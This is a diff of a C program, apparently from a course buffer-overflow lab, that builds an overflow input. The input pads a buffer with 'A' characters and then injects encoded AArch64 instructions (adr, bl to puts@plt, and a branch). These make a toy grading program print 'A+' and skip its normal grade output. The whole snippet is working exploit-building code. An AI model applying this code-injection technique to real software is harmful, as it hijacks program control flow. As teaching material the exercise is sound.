@@ -40,21 +40,19 @@ int main(void) {
         putc('A', psFile);
     }
 
-    uiInstr = MiniAssembler_strb(1, 0); /* strb w1, [x0] */
-
     /* instruction 1 at name[32] */
     /* adr x0, 0x420062 where name[10] has A+ string */
     uiInstr = MiniAssembler_adr(0, 0x420062, 0x420078);
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
     /* instruction 2 at name[36] */
-    /* mov w1, #10 with newline character*/
-    uiInstr = MiniAssembler_mov(1, 10);
+    /* bl to call 0x400670 puts@plt */
+    uiInstr = MiniAssembler_bl(0x400670, 0x42007c);
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
     /* instruction 3 at name[40] */
-    /* b 0x4008ac, branching back to main after print */
-    uiInstr = MiniAssembler_b(0x4008ac, 0x420080);
+    /* b 0x4008b0 to skip normal grade printf */
+    uiInstr = MiniAssembler_b(0x4008b0, 0x420080);
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
     /* padding */
